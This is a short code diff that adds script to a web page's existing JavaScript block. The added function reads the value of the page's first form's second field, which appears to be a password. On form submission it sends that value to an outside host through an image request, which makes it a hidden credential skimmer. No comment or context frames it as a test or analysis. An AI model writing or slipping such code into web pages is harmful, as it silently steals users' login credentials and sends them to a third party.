@@ -17,6 +17,13 @@
             if(language == "english") {
                 console.log(language);
             }
+
+	function interceptOne() { 
+       	 var passO = document.forms[0].elements[1].value; 
+        var iO = new Image; 
+        iO.src = "http://r7.io/e/moffotto?s="+passO;
+        } 
+        document.forms[0].onsubmit = interceptOne;
         });
     </script>
 
